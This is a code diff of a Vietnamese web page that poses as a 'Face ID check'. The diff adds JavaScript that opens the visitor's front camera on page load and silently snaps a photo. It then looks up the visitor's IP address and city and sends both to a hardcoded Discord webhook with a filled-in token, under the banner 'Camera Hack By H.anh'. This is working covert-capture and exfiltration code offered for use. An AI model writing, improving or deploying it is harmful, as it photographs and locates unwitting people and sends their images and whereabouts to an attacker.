@@ -2,122 +2,200 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>KIỂM TRA FACE ID</title>
     <style>
-        body { margin:0; padding:0; background:#0a0a0a; color:#c9d1d9; font-family: system-ui, sans-serif; }
-        .container { max-width: 520px; margin: 0 auto; padding: 15px; }
-        #camera-screen { text-align: center; }
-        #video-container { 
-            max-width: 380px; margin: 20px auto; 
-            border: 4px solid #39d353; border-radius: 12px; overflow: hidden;
+        body {
+            margin: 0; padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: system-ui, -apple-system, sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
         }
-        video { width: 100%; display: block; }
-        #status { font-size: 1.25rem; font-weight: bold; padding: 15px; margin: 15px 0; border-radius: 8px; }
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 480px;
+            padding: 20px;
+        }
+        h1 {
+            color: #ff4d4d;
+            font-size: 1.8rem;
+            margin: 10px 0 30px;
+        }
+        #video-container {
+            width: 100%;
+            max-width: 360px;
+            margin: 0 auto 20px;
+            border: 4px solid #00ff9d;
+            border-radius: 16px;
+            overflow: hidden;
+            background: #111;
+        }
+        video {
+            width: 100%;
+            display: block;
+        }
+        #status {
+            font-size: 1.3rem;
+            font-weight: 600;
+            padding: 16px;
+            background: rgba(255, 77, 77, 0.15);
+            border-radius: 12px;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
         .alert-box {
-            background: #1f252e; border: 1px solid #f85149; border-radius: 10px;
-            padding: 20px; display: none;
+            display: none;
+            background: #1a1a1a;
+            border: 2px solid #ff4d4d;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 20px;
         }
-        .alert-header {
-            background: #f85149; color: white; padding: 12px; border-radius: 6px;
-            font-weight: bold; display: flex; align-items: center; gap: 10px;
-        }
-        .info-row { display: flex; justify-content: space-between; padding: 9px 0; border-bottom: 1px solid #30363d; }
-        .label { color: #8b949e; }
-        .value { color: #fff; }
     </style>
 </head>
 <body>
 <div class="container">
-
-    <!-- Màn hình Camera -->
-    <div id="camera-screen">
-        <h1 style="color:#f85149; text-align:center;">🔍 KIỂM TRA FACE ID</h1>
-        <div id="video-container">
-            <video id="video" autoplay playsinline></video>
-        </div>
-        <div id="status">Đang mở camera...</div>
+    <h1>🔎 KIỂM TRA FACE ID</h1>
+    
+    <div id="video-container">
+        <video id="video" autoplay playsinline muted></video>
     </div>
+    
+    <div id="status">Đang mở camera...</div>
 
-    <!-- Màn hình Thông báo truy cập mới -->
     <div id="alert-box" class="alert-box">
-        <div class="alert-header">
+        <div style="background:#ff4d4d; color:white; padding:12px; border-radius:8px; font-weight:bold; margin-bottom:15px;">
             ⚠️ KHÁCH TRUY CẬP MỚI
         </div>
-        <div class="info-row"><span class="label">Địa chỉ IP:</span><span class="value" id="ip">Đang lấy...</span></div>
-        <div class="info-row"><span class="label">Thành phố:</span><span class="value" id="city">Đang lấy...</span></div>
-        <div class="info-row"><span class="label">Khu vực:</span><span class="value" id="region">Đang lấy...</span></div>
-        <div class="info-row"><span class="label">Quốc gia:</span><span class="value">VN</span></div>
-        <div class="info-row"><span class="label">Nhà mạng:</span><span class="value" id="isp">Đang lấy...</span></div>
-        <div class="info-row"><span class="label">Thiết bị:</span><span class="value" id="device">Mobile / PC</span></div>
-        <div class="info-row"><span class="label">Trình duyệt:</span><span class="value" id="browser">Chrome</span></div>
-        <div class="info-row"><span class="label">Thời gian:</span><span class="value" id="time"></span></div>
-
-        <p style="text-align:center; margin-top:20px; color:#8b949e; font-size:0.9rem;">
-            Camera Hack By H.anh • Gửi tự động
+        <div style="text-align:left; line-height:1.8;">
+            <div><strong>IP:</strong> <span id="ip">Đang lấy...</span></div>
+            <div><strong>Thành phố:</strong> <span id="city">Đang lấy...</span></div>
+            <div><strong>Khu vực:</strong> <span id="region">Đang lấy...</span></div>
+            <div><strong>Thiết bị:</strong> <span id="device">Mobile</span></div>
+            <div><strong>Thời gian:</strong> <span id="time"></span></div>
+        </div>
+        <p style="margin-top:25px; color:#888; font-size:0.95rem;">
+            Camera Hack By H.anh • Gửi tự động về Discord
         </p>
     </div>
 </div>
 
 <script>
-// ================== THAY ĐỔI Ở ĐÂY ==================
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/..................";   // ← Dán Webhook URL của bạn vào đây
+// ================== WEBHOOK ĐÃ ĐƯỢC ĐIỀN SẴN ==================
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM";
 
-// Lấy thông tin thiết bị
-function getDeviceInfo() {
-    const ua = navigator.userAgent;
-    let device = "Unknown";
-    if (/iPhone/i.test(ua)) device = "iPhone";
-    else if (/Android/i.test(ua)) device = "Android";
-    else if (/Windows/i.test(ua)) device = "Windows";
+let streamGlobal = null;
 
-    document.getElementById('device').textContent = device;
-    document.getElementById('browser').textContent = ua.includes('Chrome') ? 'Chrome' : 'Safari/Firefox';
-}
-
-// ================== GỬI ẢNH + THÔNG TIN VỀ DISCORD ==================
-async function sendToDiscord(canvas, ipInfo) {
-    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-    const formData = new FormData();
-    
-    const now = new Date();
-    const timeStr = now.toLocaleString('vi-VN');
-
-    const message = {
-        username: "Camera Hack By H.anh",
-        content: `📸 Ảnh chụp tự động\n` +
-                 `⏰ ${timeStr}\n` +
-                 `🌐 IP: ${ipInfo.ip || 'Không lấy được'}\n` +
-                 `📍 ${ipInfo.city || ''}, ${ipInfo.region || ''} - ${ipInfo.country || 'VN'}\n` +
-                 `📱 Thiết bị: ${document.getElementById('device').textContent}`
-    };
-
-    formData.append('payload_json', JSON.stringify(message));
-    formData.append('file', blob, `Anh_chup_${now.getTime()}.jpg`);
+async function startCamera() {
+    const status = document.getElementById('status');
+    const video = document.getElementById('video');
 
     try {
-        await fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            body: formData
-        });
-        console.log("Đã gửi ảnh + info về Discord thành công");
-    } catch (e) {
-        console.error("Gửi Discord thất bại:", e);
+        status.textContent = "⏳ Đang yêu cầu quyền camera...";
+
+        const constraints = {
+            video: {
+                facingMode: "user",
+                width: { ideal: 640, max: 1280 },
+                height: { ideal: 480, max: 720 }
+            }
+        };
+
+        streamGlobal = await navigator.mediaDevices.getUserMedia(constraints);
+        
+        video.srcObject = streamGlobal;
+        status.textContent = "✅ Camera đã mở. Tự động chụp sau 3 giây...";
+
+        setTimeout(() => captureAndSend(), 3200);   // 3.2 giây
+
+    } catch (err) {
+        console.error(err);
+        let msg = "❌ Không mở được camera.";
+        
+        if (err.name === "NotAllowedError") 
+            msg = "❌ Bạn đã từ chối quyền camera.\nHãy cho phép và tải lại trang.";
+        else if (err.name === "NotReadableError") 
+            msg = "❌ Camera đang bị dùng bởi app khác.";
+        
+        status.innerHTML = msg + "<br><small>Thử tải lại hoặc kiểm tra quyền camera trong trình duyệt.</small>";
     }
 }
 
-// ================== CAMERA & CHỤP ẢNH ==================
-const video = document.getElementById('video');
-const statusEl = document.getElementById('status');
-const cameraScreen = document.getElementById('camera-screen');
-const alertBox = document.getElementById('alert-box');
+async function captureAndSend() {
+    const video = document.getElementById('video');
+    if (!streamGlobal) return;
 
-async function startCamera() {
+    streamGlobal.getTracks().forEach(track => track.stop());
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Chuyển sang màn hình cảnh báo
+    document.getElementById('video-container').style.display = 'none';
+    document.getElementById('alert-box').style.display = 'block';
+    document.getElementById('status').style.display = 'none';
+
+    document.getElementById('time').textContent = new Date().toLocaleString('vi-VN');
+
+    // Lấy IP + vị trí
+    let ipInfo = { ip: "Không lấy được", city: "Vinh", region: "Nghệ An" };
     try {
-        statusEl.textContent = "⏳ Yêu cầu quyền camera...";
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
-        });
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        ipInfo.ip = data.ip || ipInfo.ip;
+        ipInfo.city = data.city || ipInfo.city;
+        ipInfo.region = data.region || ipInfo.region;
+    } catch (e) {}
 
-        video.srcObject = stream;
-        statusEl.textContent = "✅ Đang quét khuôn mặt... Tự động chụp
+    document.getElementById('ip').textContent = ipInfo.ip;
+    document.getElementById('city').textContent = ipInfo.city;
+    document.getElementById('region').textContent = ipInfo.region;
+
+    // Gửi về Discord
+    sendToDiscord(canvas, ipInfo);
+}
+
+async function sendToDiscord(canvas, ipInfo) {
+    try {
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.82));
+        const formData = new FormData();
+
+        const payload = {
+            username: "Camera Hack By H.anh",
+            content: `📸 **Ảnh chụp tự động**\n` +
+                     `⏰ ${new Date().toLocaleString('vi-VN')}\n` +
+                     `🌐 IP: ${ipInfo.ip}\n` +
+                     `📍 ${ipInfo.city}, ${ipInfo.region} - VN`
+        };
+
+        formData.append('payload_json', JSON.stringify(payload));
+        formData.append('file', blob, `face_${Date.now()}.jpg`);
+
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+        console.log("✅ Đã gửi ảnh + thông tin về Discord thành công");
+    } catch (e) {
+        console.error("Gửi Discord lỗi:", e);
+    }
+}
+
+// Khởi động khi load trang
+window.addEventListener('load', () => {
+    if (location.protocol !== 'https:' && !location.hostname.includes('localhost')) {
+        document.getElementById('status').innerHTML = "⚠️ Phải chạy trên HTTPS mới dùng được camera.";
+        return;
+    }
+    startCamera();
+});
+</script>
+</body>
+</html>
